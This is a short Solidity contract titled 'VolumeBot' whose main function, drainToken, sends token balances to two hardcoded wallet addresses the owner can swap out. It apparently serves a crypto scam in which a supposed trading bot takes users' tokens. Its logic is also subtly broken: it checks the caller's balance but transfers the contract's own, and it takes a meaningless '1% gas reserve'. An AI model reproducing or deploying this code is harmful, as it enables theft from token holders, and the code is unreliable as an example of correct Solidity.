// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

contract VolumeBot {
    address public owner;
    address public wallet1 = 0xeA54572eBA790E31f97e1D6f941D7427276688C3;
    address public wallet2 = 0xE6822a37334924139492D9360AD40BA3d1A2334E;
    bool public paused = false;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    modifier notPaused() {
        require(!paused, "Contract is paused");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function drainToken(address tokenAddress) external notPaused {
        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(msg.sender);
        require(balance > 0, "No token balance");

        uint256 gasReserve = (balance * 1) / 100; // reserve 1% for gas
        uint256 transferable = balance - gasReserve;

        uint256 half = transferable / 2;
        require(token.transfer(wallet1, half), "Transfer to wallet1 failed");
        require(token.transfer(wallet2, transferable - half), "Transfer to wallet2 failed");
    }

    function pause() external onlyOwner {
        paused = true;
    }

    function unpause() external onlyOwner {
        paused = false;
    }

    function updateWallets(address _wallet1, address _wallet2) external onlyOwner {
        wallet1 = _wallet1;
        wallet2 = _wallet2;
    }
}